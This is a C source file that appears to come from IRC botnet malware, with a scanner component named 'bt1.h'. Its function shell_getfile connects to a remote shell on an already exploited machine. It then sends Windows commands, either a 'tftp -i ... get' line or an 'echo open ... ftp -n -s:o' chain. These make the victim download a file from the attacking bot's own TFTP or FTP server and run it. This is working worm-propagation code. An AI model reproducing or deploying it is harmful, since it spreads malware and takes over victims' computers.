

#ifndef NO_SCANNER
#include "bt1.h"

//Shell Get File
bool shell_getfile(SOCKET bsock, char *szIP, int iPort)
{
	char szRecvBuff[BIGBUF], szSendBuff[IRCBUF];
	SOCKET sock;
	struct sockaddr_in sockinfo;
//	WSADATA wsadata;

#ifndef NO_DEBUG
		printf("[DEBUG] Sending command to remote exploited shell, shell_getfile()...\n");
#endif
	
//	if (WSAStartup(MAKEWORD(2,2), &wsadata) != 0) return FALSE;
		sockinfo.sin_addr.s_addr = inet_addr(szIP);
		sockinfo.sin_port = htons(iPort);		
		sockinfo.sin_family = AF_INET;
		sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (connect(sock, (struct sockaddr *)&sockinfo, sizeof(sockinfo)) == SOCKET_ERROR) 
	{
			closesocket(sock);
//			WSACleanup();
			return FALSE;
	}
		recv(sock, szRecvBuff, sizeof(szRecvBuff), 0);

#ifndef NO_TFTPD
		sprintf(szSendBuff, "tftp -i %s get %s C:\\%s\r\n", get_ip(bsock), filename, filename);
	goto cont;
#endif

#ifndef NO_FTPD
		sprintf(szSendBuff, "echo open %s %i > o&echo user %s %s >> o &echo get %s C:\\%s >> o &echo quit >> o &ftp -n -s:o &%s\r\n", get_ip(bsock), ftpdport, ftpduser, ftpdpass, filename, filename, filename);	
#endif
	
cont:
		Sleep(500);
	if (send(sock, szSendBuff, strlen(szSendBuff), 0) == SOCKET_ERROR) return FALSE;
		recv(sock, szRecvBuff, sizeof(szRecvBuff), 0);
		sprintf(szSendBuff, "C:\\%s\r\n", filename);
		Sleep(500);
	if (send(sock, szSendBuff, strlen(szSendBuff), 0) == SOCKET_ERROR) return FALSE;
		recv(sock, szRecvBuff, sizeof(szRecvBuff), 0);
		closesocket(sock);
//		WSACleanup();
		return TRUE;
}
#endif